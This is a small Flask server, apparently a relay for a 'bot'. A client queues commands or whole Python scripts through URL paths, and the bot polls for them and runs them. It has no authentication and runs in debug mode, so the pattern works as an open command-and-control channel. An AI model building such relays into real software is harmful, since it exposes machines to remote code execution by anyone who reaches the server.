from flask import Flask, request, jsonify
import os
import random

app = Flask(__name__)

servStats = "stopped"
currentCommand = ""
currentScript = ""

@app.route('/updatestats/<stats>')  # used by bot to set server status
def updateStats(stats):
    global servStats
    servStats = stats
    return "done."

@app.route('/getstats')  # used by client to get bot stats
def returnStats():
    global servStats
    return servStats

@app.route('/command/<command>')  # used by client to send instructions to the bot
def Command(command):
    global currentCommand
    if command == 'none':
        currentCommand = ""
    else:
        currentCommand = command
    return 'done.'

@app.route('/sendscript/<script>')  # used by client to send a python script to bot
def setScript(script):
    global currentScript
    if script == 'none':
        currentScript = ""
    else:
        currentScript = script
    return "done."
        
@app.route('/getscript')  # used by bot to get script to run
def returnScript():
    global currentScript
    return currentScript

@app.route('/getcommand')
def returnCommand():
    global currentCommand
    return currentCommand

if __name__ == '__main__':
    app.run(debug=True, port=os.environ.get('PORT', "8080"))
